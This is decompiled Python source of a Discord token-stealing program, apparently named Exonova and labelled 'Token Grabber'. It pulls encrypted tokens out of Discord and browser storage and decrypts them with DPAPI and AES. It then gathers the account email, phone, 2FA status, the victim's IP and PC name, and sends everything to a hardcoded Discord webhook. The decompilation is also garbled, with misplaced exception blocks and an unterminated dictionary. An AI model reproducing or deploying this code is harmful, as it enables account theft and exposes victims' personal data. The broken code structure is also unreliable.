# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: Exonova.py
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
import os
from datetime import datetime
import time
tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:(-16)].decode()
    except:
        return 'Error'

def getip():
    ip = 'None'
    try:
        ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass
    else:  # inserted
        return ip

def gethwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + '\\Google\\Chrome\\User Data'
    paths = {'Discord': roaming + '\\discord', 'Discord Canary': roaming + '\\discordcanary', 'Lightcord': roaming + '\\Lightcord', 'Discord PTB': roaming + '\\discordptb', 'Opera': roaming + '\\Opera Software\\Opera Stable', 'Opera GX': roaming + '\\Opera Software\\Opera GX Stable', 'Amigo': local + '\\Amigo\\User Data', 'Torch': local + '\\Torch\\User Data', 'Kometa': local + '\\Kometa\\User Data', 'Orbitum': local + '\\Orbitum\\User Data', 'CentBrowser': local + '\\CentBrowser\\User Data', '7Star': local + '\\7Star\\7Star\\User Data', 'Sputnik': local + '\\Sputnik\\Sputnik\\User Data', 'Vivaldi': local + '\\Vivaldi\\User Data\\Default', 'Chrome SxS': chrome + 'Default', '\\Google\\Chrome SxS\\User Data': chrome + 'Epic Privacy Browser', '\\Epic Privacy Browser\\User Data': chrome + '\\Microsoft\\Edge\\User Data\\Defaul', '\\uCozMedia\\Uran\\User Data\\Default': chrome + '\\Yandex\\YandexBrowser\\User Data\\Default', '
    for platform, path in paths.items():
        if os.path.exists(path):
            try:
                with open(path + '\\Local State', 'r') as file:
                    pass  # postinserted
        except:
            pass
                    key = loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
                    else:  # inserted
                        for file in listdir(path + '\\Local Storage\\leveldb\\'):
                            if file.endswith('.ldb') or not file.endswith('.log'):
                                try:
                                    with open(path + f'\\Local Storage\\leveldb\\{file}', 'r', errors='ignore') as files:
                                        pass  # postinserted
                                except PermissionError:
                                        for x in files.readlines():
                                            x.strip()
                                            for values in findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\\"]*', x):
                                                tokens.append(values)
                        else:  # inserted
                            for i in tokens:
                                if i.endswith('\\'):
                                    i.replace('\\', '')
                                else:  # inserted
                                    if i not in cleaned:
                                        cleaned.append(i)
                            for token in cleaned:
                                pass  # postinserted
                            try:
                                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                    except IndexError == 'Error':
                            else:  # inserted
                                checker.append(tok)
                                for value in checker:
                                    if value not in already_check:
                                        already_check.append(value)
                                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                                        try:
                                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        except:
                            pass
                                        else:  # inserted
                                            if res.status_code == 200:
                                                res_json = res.json()
                                                ip = getip()
                                                pc_username = os.getenv('UserName')
                                                pc_name = os.getenv('COMPUTERNAME')
                                                user_name = f"{res_json['username']}#{res_json['discriminator']}"
                                                user_id = res_json['id']
                                                email = res_json['email']
                                                phone = res_json['phone']
                                                mfa_enabled = res_json['mfa_enabled']
                                                has_nitro = False
                                                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                                                nitro_data = res.json()
                                                has_nitro = bool(len(nitro_data) > 0)
                                                days_left = 0
                                                if has_nitro:
                                                    d1 = datetime.strptime(nitro_data[0]['current_period_end'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                                                    d2 = datetime.strptime(nitro_data[0]['current_period_start'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                                                    days_left = abs((d2 - d1).days)
                                                embed = f"**{user_name}** *({user_id})*\n\n> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{(days_left if days_left else 'None')} day(s)`\n\n> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n\n> :piñata: __Token__\n\t`{tok}`\n\n*Made by Exot1cBlox* **|** ||https://www.youtube.com/@Exot1cBl0x||"
                                                payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Exot1cBlox', 'avatar_url': 'https://cdn.discordapp.com/attachments/1307789033367277679/1307789668955193424/E__3_-removebg-preview.png?ex=673b958a&is=673a440a&hm=f077a5533d1e982739649af24e794b44c88cf045f7f53116bc5133dd0050f43e&'})
                                                try:
                                                    headers2 = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                                                    req = Request('https://discord.com/api/webhooks/1307789051109052538/TQ4WbRTEVG7I7s77k-PayWJc9QSIyDEFX-_8jLlxCOwAECd291nIc_D5HiwseUsoDAYO', data=payload.encode(), headers=headers2)
                                                    urlopen(req)
                                                except:
                                                    pass
                                    else:  # inserted
                                        continue
    pass
    pass
if __name__ == '__main__':
    get_token()